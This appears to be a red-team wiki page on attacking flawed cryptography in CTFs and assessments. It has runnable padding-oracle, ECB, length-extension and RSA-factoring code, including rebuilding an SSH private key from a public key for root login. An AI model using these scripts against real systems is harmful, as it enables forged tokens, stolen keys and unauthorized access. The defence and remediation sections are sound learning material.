---
title: "Cryptography Attacks (CTF + Applied)"
type: technique
tags: [crypto, ctf, rsa, aes, padding-oracle, ecdsa, prng, hash-length-extension]
phase: exploitation
date_created: 2026-06-16
date_updated: 2026-07-14
sources: [hacktricks-crypto]
---

## What it is

Breaking cryptography through implementation flaws and misuse rather than brute force: weak parameters, mode misuse, oracle leaks, nonce/key reuse, and predictable randomness. The dominant CTF crypto category and a real-world finding class (JWT, TLS, custom token schemes).

## How it works

Textbook primitives are secure; deployments are not. Attacks exploit small exponents, repeated nonces, malleable modes, side-channel oracles, and homebrew constructions. Identify the primitive, find the misuse, apply the matching attack.

## Attack phases
Exploitation (CTF challenge solving; applied to JWT/token/TLS findings during web + AD work).

## Prerequisites
- The ciphertext/scheme, and ideally the source or an oracle (encrypt/decrypt endpoint, error differences, timing).
- Public parameters (RSA `n,e`; curve; IV/nonce handling).

## Methodology

### RSA
```bash
# triage: factor n, weak params, then decrypt
RsaCtfTool --publickey key.pem --uncipher cipher.bin   # tries 30+ attacks
python3 -c "import factordb"   # factordb.com lookup for known n
```
- Small `e` (e=3) + short message -> cube root (`gmpy2.iroot(c,3)`); Hastad broadcast (same m, e recipients).
- Close primes -> Fermat factorization. Small `d` -> Wiener. Shared prime across keys -> batch GCD.
- Common modulus (same n, two e, gcd(e1,e2)=1) -> extended Euclid. LSB/parity decryption oracle -> binary search plaintext.

### Block ciphers (AES/DES)
- **ECB**: identical plaintext blocks -> identical ciphertext. Cut-and-paste blocks; byte-at-a-time ECB decryption against an encryption oracle (append controlled prefix).
- **CBC bit-flipping**: XOR ciphertext block `C[i-1]` to flip chosen plaintext bytes in `P[i]` (e.g. flip `admin=0` -> `admin=1`).
- **CBC padding oracle**: decryption error vs padding error distinction -> `padbuster URL ciphertext blocksize`; recover/forge plaintext without the key. **Forging (CBC-R) is the payload**, not just decryption: if the decrypted value is *used* server-side (run as a shell command, put in a SQL query, deserialized), forge a ciphertext decrypting to your injection -> **RCE/SQLi without the key** (THM Decryptify: decrypted `?date=` was run via `shell_exec`, output echoed; forge `cat /flag` -> RCE). Fingerprint the cipher from the openssl error it leaks: an **8-byte IV/block = a 64-bit cipher (DES/3DES/Blowfish/CAST5), NOT AES** (16-byte) -- stop trying AES keys. Oracle signal = a distinct "padding error" string vs a clean render. No `padbuster`? A ~60-line Python oracle does decrypt + CBC-R encrypt (recover intermediate `D(C)` byte-by-byte, then `IV/prev = D(C) xor P`).
- **Keystream/OTP reuse** (CTR, stream, reused IV): `C1 xor C2 = P1 xor P2` -> crib-drag. GCM nonce reuse -> forge auth tag (recover H).

### Hashes
- **Length extension** (MD5/SHA1/SHA256 MAC = `H(secret||msg)`): `hashpump -s sig -d known -a append -k keylen` to forge valid MAC for extended message.
- Weak hash collisions (MD5 chosen-prefix). Cracking -> see [[hash-capture-and-cracking]] and [[password-cracking]].

### PRNG / randomness
- Mersenne Twister: 624 consecutive 32-bit outputs -> recover state -> predict (`randcrack`). LCG: solve from a few outputs. Time-seeded -> brute the seed window. See [[insecure-randomness]].
- **Seed-from-known-inputs token forge** (weak invite/reset tokens): when a token is `f(mt_srand(seed(known_inputs, CONST)); mt_rand())` and the seed derives from attacker-known values (email length/chars) plus one unknown constant, you don't need 624 outputs -- recover `CONST` offline from **ONE leaked (input, output) pair** (often disclosed in a log/`/logs/app.log`) by brute-forcing `CONST` locally until the pair reproduces, then forge tokens for any other user. Replicate the target's PRNG exactly: **PHP's `mt_rand` is stable across 7.1+**, so PHP 8 cli reproduces a PHP 7.x target. (THM Decryptify: `seed=hexdec(strlen(email)+CONST+hexdec(substr(email,0,8)))`, one log line gave the pair, `CONST=99999` fell out, forged any invite code.)

### ECC / signatures
- **ECDSA nonce reuse** (same `k` for two sigs) -> recover private key algebraically. Predictable/biased `k` -> lattice (LLL) attack. Invalid-curve / small-subgroup -> recover key mod small primes (CRT).

### Classical / encoding
- Caesar/Vigenere/substitution -> `dcode.fr`, CyberChef, frequency analysis. XOR -> `xortool -c ' '`. Encoding chains -> [[encoding-transformations]].

## Bypasses and variants
- Multi-layer: base64 -> XOR -> RSA. Always re-`file`/entropy-check decoded output.
- Custom hash/cipher: model in `z3` or `sage` and solve symbolically.

## Detection and defence
Use vetted libraries (libsodium); authenticated encryption (AES-GCM with unique nonces); constant-time comparison; CSPRNG (`secrets`, `/dev/urandom`); RSA-OAEP not textbook RSA; reject reused nonces.

## Tools
`RsaCtfTool`, `sage`, `factordb`, `hashpump`, `xortool`, `padbuster`, CyberChef, `z3`, `randcrack`. Hash cracking: [[wiki/tools/hashcat]], [[password-cracking]].

## Structured-limb ("short-sleeve") RSA key factoring

A broken big-integer RNG can leak structure straight into the public modulus: each 32/64/128-bit limb carries only a few random bytes and the rest are zero, so `n` shows regularly-spaced zero windows at a fixed stride. Classic bug is sizing a `bits/32` limb array but filling only that many bytes, giving each limb ~8 bits of entropy. When both primes are structured this way, `n` factors from the public key alone.

Detection and attack:
```text
# 1. dump n in hex, look for repeated zero windows at a 32/64/128-bit stride
# 2. re-slice n into limbs base B=2^w; if each limb is unusually small it is short-sleeve
# 3. write n as a polynomial f_n(x) in base B  (n = sum n_i * B^i)
# 4. factor f_n(x) over the integers in Sage; evaluate candidate factors at x=B
# 5. verify which candidates multiply back to n
```
If low-end alignment fails, search shifts i,j so `2^i*p` and `2^j*q` become sparse, factor, then recombine. Audit real SSH/TLS host keys for this and related weak-key classes with `badkeys`. A reused broken routine also cripples DSA: a structured private exponent shrinks the discrete-log search enough for baby-step giant-step. This does not touch correctly-generated RSA.

## CTR/GCM nonce reuse: structured known-plaintext and PKCS#8 key-offset recovery

Beyond the `C1 xor C2 = P1 xor P2` crib-dragging noted above, structured data gives you huge free known-plaintext regions, and structured secrets leak even without full plaintext.

- Highly-structured carriers (X.509 certs, file headers, JSON/CBOR, ASN.1) let you XOR the ciphertext against the predictable body to recover long keystream stretches, then decrypt anything else encrypted under the same key+IV at the same offsets.
- Same-format secrets under a reused keystream leak by field alignment. Two PKCS#8 RSA keys of the same modulus size place their prime factors at matching offsets (~99.6% alignment for 2048-bit). XOR the two ciphertexts and you isolate `p xor p'` / `q xor q'`, brute-recoverable in seconds.
- A constant/default library IV (e.g. `000...01`) turns CTR into a repeated one-time pad on every message. Treat any AEAD nonce reuse (CTR/GCM/GCM-SIV) as critical: keystream recovery plus, for GCM under repeated nonce, authentication-tag forgery (recover H).
- CTR/CBC without a tag are malleable: bit-flips in ciphertext flip the same plaintext bits, a privilege-escalation primitive when integrity is absent. Fix is AEAD with enforced tag verification.

## CBC-MAC variable-length forgery

CBC-MAC (`tag = last block of CBC-encrypt(key, msg, IV=0)`) is only secure for fixed-length messages with domain separation. Tokens/cookies that MAC a username or role with CBC-MAC are forgeable: given tags for chosen messages, you can craft a tag for a concatenation without the key by exploiting how CBC chains blocks (the tag of msg1 becomes the effective IV for the tail). Recognize it in CTF cookies of the form `data || tag`. Defenses: HMAC-SHA256/512, correctly-used AES-CMAC, and binding the message length into the MAC input.

## Sources

- HackTricks (crypto), ingest slug `hacktricks-crypto`.

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[crypto]]

## Home-rolled crypt()-per-block cookies are ECB (salt-exposed offline forge + reflected-header oracle)

A token built as `foreach (str_split($plain,8) as $b) $out .= crypt($b,$SALT);` is ECB by another
name: each 8-byte chunk is enciphered independently. Fingerprint from the wire, not the source: the
cookie is a run of fixed 13-char blocks, each a 2-char DES salt + 11-char hash, the salt constant
within one token but random per issue. The exposed salt removes the usual "need an oracle" caveat on
the two ECB attacks:

- **Forge with no key, offline.** Plaintext is `user:UA:SECRET`. If two roles are the same length
  (`guest`/`admin`, both 5) only block 0 differs; every later block enciphers the identical
  `UA:SECRET` tail. Fetch a normal cookie, keep blocks `1..N` verbatim, recompute ONLY block 0 as
  `crypt("admin:"+UA[0:2], salt)` locally (salt = cookie's first 2 bytes, `crypt` is public) -> submit
  as admin. No encrypt-oracle endpoint, no key.
- **Recover the appended SECRET byte-at-a-time.** A reflected value in the plaintext (here the
  `User-Agent`) is the controlled-prefix lever: pick a UA length `L` with `(L+i) % 8 == 0` so secret
  byte `i` is the last byte of a block with 7 known bytes before it, then brute 95 printable chars
  against that block using the salt from the same response. The cookie-issuing endpoint IS the oracle.

<!-- promoted-slug: crypt-per-block-ecb-cookie -->

### RSA private key from a known/deterministic seed (no factoring)

When keygen is **deterministic from an attacker-known seed**, rebuild the private key directly - no
factoring, regardless of modulus size. The tell: a docs / `/debug` endpoint (or source) spelling out
the derivation, e.g. seed = `f(username, CONST)`, `p = nextprime(int(SHA256(seed)))`, `q =
nextprime(int(SHA256(seed + b"pki")))`, `n = p*q`, `e = 65537`. Reproduce it exactly and compute `d
= pow(e, -1, (p-1)*(q-1))`; the advertised size ("RSA-2048") is often a decoy - the real `n` can be
~512-bit.
- **Match "nextprime" precisely:** "check consecutive integers until prime" INCLUDES the start value,
  so `p = x if isprime(x) else nextprime(x)` (sympy's `nextprime` returns strictly `>x` and is
  off-by-one when the hash int is itself prime).
- **A public verify endpoint is a signature oracle.** Reconstruct the signer's key, sign a message,
  submit -> valid/invalid confirms both the key AND the padding. Padding is usually unknown, so brute
  the handful against the oracle: `PSS(MAX salt)`, `PSS(32)`, `PSS(0)`, `PKCS1v15`, with `e` in
  `{65537, 3, 17}` (build the key with the `cryptography` lib's `RSAPrivateNumbers`; ensure `p>q`).
- Same primitive breaks any per-user signed-message / JWT / token scheme keyed on the seed: forge as
  any user (admin), decrypt private messages, impersonate. Distinct from the PRNG-token forge above
  (which recovers a hidden CONST from one output pair; here the whole derivation is disclosed).
- Web pairing seen repeatedly: passwordless/username-only login for the session + this forge for the
  "cryptographic" gate. See [[insecure-randomness]].

<!-- promoted-slug: rsa-deterministic-seed-keygen -->

## Forge a custom binary's signed (HMAC) protocol by reproducing its key derivation offline

When a stripped binary (an implant/agent/updater) authenticates its own protocol with
HMAC-SHA256 and the key is derived from material you can READ, the key is fully recoverable - so
you can forge valid signed messages/tasks without ever having the "real" secret:

- **hardcoded blob** in `.rodata` (dump with `objdump -s -j .rodata` / radare2),
- a **PRNG pad with a hardcoded seed** (deterministic, not random), and
- a **world/other-readable file** (`/etc/machine-id`, a hostid, a serial).

Recover it: RE the key schedule (`radare2 -A`, follow the arg to `HMAC` - `rsi`=key, `rdx`=keylen,
`rcx`=data), reproduce the exact derivation in Python, then **verify against one captured live
signature before forging** (a single mismatch means a byte/order is wrong).

**Recognize the classic glibc `rand()` LCG** when it appears as a key/pad generator (a hardcoded
seed makes the output a fixed pad, trivially reproduced):

```
state = state * 0x41c64e6d + 0x3039        # mult 1103515245, add 12345 (glibc TYPE_0 rand)
byte  = (state >> 16) & 0xff
```

Typical schedule seen in the wild: `key_seed = blob XOR lcg_pad`, then
`msg_key = HMAC(key_seed, machine_id)`, then each message `= fields | HMAC(msg_key, fields)`.
Same idea breaks any home-rolled signed IPC/C2/token scheme whose key lives in a readable binary.
See [[insecure-randomness]] for predicting a *live* (non-seeded) PRNG stream instead.

<!-- promoted-slug: binary-signed-protocol-forge -->

## Fermat factorization (near-equal primes)

A deprecated/weak keygen library can pick p and q very close together. Then n factors from the
public key alone in ~one iteration (a starts at ceil(sqrt(n)) and lands on the answer immediately):

```python
from math import isqrt, lcm
a = isqrt(n) + 1
while True:
    b2 = a*a - n
    b = isqrt(b2)
    if b*b == b2:
        break
    a += 1
p, q = a + b, a - b          # p*q == n
d = pow(e, -1, lcm(p-1, q-1))
```

`RsaCtfTool --publickey key.pem` includes this (fermat) among its attacks; the loop above is the
manual version and is instant when p ~ q.

### Applied: recover an SSH login key from a leaked `id_rsa.pub`

A leaked *public* key is enough when the primes are Fermat-weak. Parse `n,e` from the ssh-rsa wire
format (`string "ssh-rsa"`, mpint e, mpint n), factor, then rebuild the private half and log in:

```python
import base64, struct
from Crypto.PublicKey import RSA
blob = base64.b64decode(open("id_rsa.pub").read().split()[1])
o=0
def rd():
    global o; l=struct.unpack(">I",blob[o:o+4])[0]; o+=4; v=blob[o:o+l]; o+=l; return v
rd(); e=int.from_bytes(rd(),"big"); n=int.from_bytes(rd(),"big")   # skip "ssh-rsa", then e, n
# ...Fermat as above...
open("id_rsa","wb").write(RSA.construct((n,e,d,p,q)).export_key("PEM"))
# chmod 600 id_rsa && ssh -i id_rsa root@host   (works if root SSH login is enabled)
```

Tell: two near-identical primes -> `p - q` is tiny (a few thousand). Key length = `n.bit_length()`.

<!-- promoted-slug: rsa-fermat-close-primes -->

# Crypto implementation attacks

Distilled from claude-red `offensive-crypto-attacks`; feeds `wiki/techniques/cracking/cryptography-attacks.md` on promote. Attacks misuse of primitives, not the primitives. Operator promotes; never auto-promoted.

Workflow: identify crypto touchpoints (cookies, tokens, signed URLs, stored creds) -> fingerprint algorithm/mode (length behavior, block alignment, base64/hex layers) -> classify weakness class -> tool or custom script -> decrypt/forge -> document root cause + remediation.

Ciphertext heuristics: multiple of 8 bytes = DES/3DES CBC/ECB; multiple of 16 = AES CBC/ECB; plaintext+16 = AES-GCM; fixed length regardless of input = hash, not encryption.

## Padding oracle (CBC + PKCS7)

Decision flow:

1. Submit modified ciphertext (flip last byte of the previous block / IV) to the decrypting endpoint.
2. Observe the response across valid vs invalid padding: different status codes, different error strings, timing differences, or behavioral changes. ANY stable binary signal is the oracle.
3. One bit per request suffices to decrypt any block AND forge arbitrary plaintext (Vaudenay 2002; Rizzo/Duong 2010).
4. No signal after systematic probing = no oracle; move to the next class, do not grind.

padbuster invocation:

```bash
# decrypt: URL target-value block-size(8|16) -error <oracle string>
padbuster http://target.com/app?token=EncryptedValue EncryptedValue 16 \
  -cookies "session=EncryptedValue" -encoding 0 -error "invalid"

# forge:
padbuster http://target.com/app?token=EncryptedValue EncryptedValue 16 \
  -cookies "session=EncryptedValue" -encoding 0 -error "invalid" \
  -plaintext "admin=true;user=attacker"
```

Custom oracle when padbuster cannot handle the encoding/transport: per byte position (right to left), set already-recovered IV bytes to `intermediate[k] ^ pad_val`, brute the current byte 0-255, disambiguate the last-byte edge case by flipping the neighboring bit and re-querying; `plaintext = intermediate ^ prev_block`.

Detection pressure (defender view): hundreds of sequential requests to one endpoint with a single changing byte; alert on binary pass/fail responses for encrypted input.

## ECB: determinism attacks

Detect: encrypt a probe of 3+ identical blocks (`b"A" * 48`); 2+ identical output blocks = ECB.

```python
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))
```

Byte-at-a-time (oracle appends a secret after your input): for each unknown byte, craft input length so the target byte lands last in a block, capture that ciphertext block, then brute 256 candidate bytes appended to already-recovered prefix until the blocks match.

```python
def byte_at_a_time_ecb(oracle_func, block_size=16):
    recovered = b""
    baseline_len = len(oracle_func(b""))
    for i in range(baseline_len):
        block_index = len(recovered) // block_size
        pad_len = block_size - 1 - (len(recovered) % block_size)
        padding = b"A" * pad_len
        target_block = oracle_func(padding)[block_index*block_size:(block_index+1)*block_size]
        for byte_val in range(256):
            test = oracle_func(padding + recovered + bytes([byte_val]))
            if test[block_index*block_size:(block_index+1)*block_size] == target_block:
                recovered += bytes([byte_val]); break
    return recovered
```

Cut-and-paste: where structured data (JSON, key=value, serialized objects) is ECB-encrypted and you control part of the input, assemble ciphertext blocks from your own encrypted blocks to mint a valid object with attacker-controlled fields.

Detection pressure: long runs of 16+ identical bytes submitted to encryption endpoints.

## Hash length extension

Vulnerable construction: `MAC = H(secret || message)` with a Merkle-Damgard hash (MD5/SHA1/SHA256). You need only original MAC, message, and secret length (brute the length range 8-32 if unknown). HMAC is IMMUNE; if HMAC is in use, pivot classes.

```bash
hashpump -s "original_mac_hex" -d "original_data" -a "&admin=true" -k 16
```

```python
import hashpumpy
for key_len in range(8, 33):
    new_mac, new_data = hashpumpy.hashpump(original_mac, original_data, "&admin=true", key_len)
    resp = requests.get(f"http://target.com/api?data={new_data.hex()}&mac={new_mac}")
    if resp.status_code == 200 and "admin" in resp.text:
        break   # key_len found, forged MAC accepted
```

Detection pressure: null bytes (`%00`) in params that should be printable; message bodies longer than expected with padding artifacts.

## RSA weak parameters

Order: attack parameters before padding. RsaCtfTool first:

```bash
RsaCtfTool --publickey pubkey.pem --private                     # auto attack
RsaCtfTool --publickey pubkey.pem --uncipherfile ciphertext.bin # decrypt with weak key
RsaCtfTool --publickey "key1.pem,key2.pem" --private            # common factor across keys
RsaCtfTool --publickey pubkey.pem --attack wiener   # small d
RsaCtfTool --publickey pubkey.pem --attack smallq   # small factor
RsaCtfTool --publickey pubkey.pem --attack fermat   # p,q too close
```

- Small e (e=3) with short message (`m^e < n`): ciphertext is literally `m^e`, take the integer e-th root (`gmpy2.iroot`).
- Hastad broadcast: same message to e recipients under e=3, CRT-combine, take the root.
- Bleichenbacher (PKCS#1 v1.5): oracle = any system distinguishing valid vs invalid v1.5 padding (TLS alerts, API error codes, timing). ~2^20 queries to recover plaintext.
- Coppersmith: known high bits of a factor (or partial plaintext) -> SageMath `small_roots(X=2^64, beta=0.5)` recovers the rest; `q = n // p`.

```python
# sage: recover p from known high bits
P.<x> = PolynomialRing(Zmod(n))
f = p_approx + x
roots = f.small_roots(X=2^64, beta=0.5)
if roots:
    p = p_approx + int(roots[0]); q = n // p
```

## MT19937 recovery

Mersenne Twister state clones from exactly 624 consecutive 32-bit outputs: untemper each output (reverse the four temper steps, the shift-xor ones iteratively), load into `random.Random().setstate((3, tuple(state + [624]), None))`, predict all future outputs.

```python
def untemper(y):
    y ^= y >> 18
    y ^= (y << 15) & 0xEFC60000
    tmp = y
    for _ in range(7): tmp = y ^ ((tmp << 7) & 0x9D2C5680)
    y = tmp
    tmp = y
    for _ in range(3): tmp = y ^ (tmp >> 11)
    return tmp

def clone_mt19937(outputs_624):
    state = (3, tuple([untemper(o) for o in outputs_624] + [624]), None)
    cloned = random.Random(); cloned.setstate(state)
    return cloned
```

Time-seeded PRNGs: brute the seed window (`random.seed(int(time.time()))` -> iterate plausible unix timestamps, compare first `getrandbits(32)` to the observed token). Applies to password-reset tokens, session IDs, generated filenames.

## Timing side channel

Byte-by-byte comparison of MACs/tokens/passwords leaks position of first mismatch. Median-of-N samples per candidate byte (50-100+ over network jitter); pick the slowest candidate, append, repeat. Countermeasure their side: constant-time comparison everywhere.

## AES-GCM nonce reuse

Same key + same nonce twice: XOR of ciphertexts = XOR of plaintexts, and the tag relationship `tag1 XOR tag2 = GHASH(H, aad1, ct1) XOR GHASH(H, aad2, ct2)` gives a polynomial in H over GF(2^128); solving it recovers the GHASH key and enables tag forgery (Joux 2006). Defense: nonce-misuse-resistant AEAD (AES-GCM-SIV, XChaCha20-Poly1305).

## Key derivation

- Single-iteration unsalted `sha256(password)` = direct wordlist crack.
- PBKDF2 minimums (OWASP 2024): sha1 1,300,000; sha256 600,000; sha512 210,000. Below = weak finding. Argon2id preferred.

## Remediation (one-liners for FIND cards)

- CBC without auth -> AES-GCM / ChaCha20-Poly1305; never leak padding validity.
- `H(secret||message)` -> HMAC.
- RSA: 2048-bit minimum, OAEP padding, never e=3 with short messages.
- PRNG: `secrets` module / `/dev/urandom`; never time/PID seeds.
- Compare secrets in constant time.

## Worked self-checks (runnable)

```python
# ECB detector: ECB repeats blocks, CBC does not
from Crypto.Cipher import AES
key, iv = b"0"*16, b"0"*16
assert detect_ecb(AES.new(key, AES.MODE_ECB).encrypt(b"A"*48))
assert not detect_ecb(AES.new(key, AES.MODE_CBC, iv=iv).encrypt(b"A"*48))

# MT19937 clone: predicts the next draw after 624 observed outputs
r = random.Random(20261119)
observed = [r.getrandbits(32) for _ in range(624)]
assert clone_mt19937(observed).getrandbits(32) == r.getrandbits(32)

# small-e root: m^3 < n means the ciphertext is a plain integer cube
from gmpy2 import iroot
m = 0xdeadbeef; n = 1 << 512
root, perfect = iroot(m**3 % n if m**3 >= n else m**3, 3)
assert perfect and int(root) == m
```

References: Vaudenay EUROCRYPT 2002; Bleichenbacher CRYPTO 1998; Rizzo/Duong WOOT 2010; Coppersmith 1997; Joux 2006; CWE-327/328/330; tools RsaCtfTool, PadBuster, HashPump.

<!-- promoted-slug: crypto-implementation-attacks -->
